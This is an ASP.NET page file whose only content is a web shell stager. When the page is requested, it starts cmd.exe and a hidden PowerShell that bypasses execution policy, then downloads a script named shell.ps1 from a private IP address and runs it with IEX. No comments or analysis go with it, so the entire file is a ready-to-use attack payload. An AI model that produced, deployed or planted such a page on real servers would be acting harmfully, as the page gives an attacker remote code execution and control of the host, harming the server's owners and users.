<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.214/shell.ps1')\"";
    p.Start();
%>
